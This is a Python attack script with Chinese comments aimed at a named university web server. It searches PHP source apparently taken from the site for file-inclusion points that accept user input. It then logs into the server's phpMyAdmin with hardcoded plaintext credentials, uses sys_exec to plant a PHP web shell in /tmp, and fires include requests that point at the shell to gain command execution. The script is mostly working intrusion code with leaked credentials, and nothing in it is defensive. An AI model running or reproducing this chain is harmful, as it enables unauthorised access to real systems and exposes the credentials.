#!/usr/bin/env python3
import requests
import urllib3
import re
import os
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

base_url = "https://olympic.su.ac.th"
output_dir = "/tmp/git_php_files"

print("[*] 测试文件包含漏洞...")

# 从下载的文件中提取包含功能
include_files = []
for root, dirs, files in os.walk(output_dir):
    for file in files:
        if file.endswith('.php'):
            file_path = os.path.join(root, file)
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            if ('include' in content.lower() or 'require' in content.lower()) and ('$_GET' in content or '$_POST' in content):
                rel_path = file_path.replace(output_dir + '/', '').replace('_', '/')
                if rel_path.startswith('enmeeting/'):
                    include_files.append(rel_path)
                    get_params = re.findall(r'\$_GET\[["\']([^"\']+)["\']\]', content)
                    post_params = re.findall(r'\$_POST\[["\']([^"\']+)["\']\]', content)
                    print(f"[+] {rel_path}")
                    print(f"    GET参数: {get_params}")
                    print(f"    POST参数: {post_params}")

# 先写入shell
print("\n[*] 写入shell到/tmp...")
pma_url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

login_data = {'pma_username': 'mysql', 'pma_password': 'Mu123.123.', 'server': '1'}
resp = session.post(pma_url + 'index.php', data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text).group(1)

shell_code = "<?php system($_GET['c']); ?>"
cmd = f"echo '{shell_code}' > /tmp/shell.php"
sql = f"SELECT sys_exec('{cmd}');"
sql_data = {'sql_query': sql, 'db': 'mysql'}
session.post(pma_url + 'server_sql.php', params={'token': token, 'db': 'mysql'}, data=sql_data, verify=False)

# 测试文件包含
for include_file in include_files:
    web_path = f"/{include_file}"
    print(f"\n[*] 测试 {web_path}...")
    
    # 获取参数
    file_path = os.path.join(output_dir, include_file.replace('/', '_'))
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()
    
    get_params = re.findall(r'\$_GET\[["\']([^"\']+)["\']\]', content)
    post_params = re.findall(r'\$_POST\[["\']([^"\']+)["\']\]', content)
    all_params = list(set(get_params + post_params))
    
    for param in all_params[:10]:
        # GET请求
        test_url = f"{base_url}{web_path}?{param}=/tmp/shell.php&c=id"
        resp = requests.get(test_url, verify=False, timeout=5)
        if 'uid=' in resp.text:
            print(f"[+] Shell获取成功: {test_url}")
            exit(0)
        
        # POST请求
        data = {param: '/tmp/shell.php', 'c': 'id'}
        resp = requests.post(f"{base_url}{web_path}", data=data, verify=False, timeout=5)
        if 'uid=' in resp.text:
            print(f"[+] Shell获取成功: {web_path} POST {param}")
            exit(0)

print("\n[+] 文件包含测试完成")
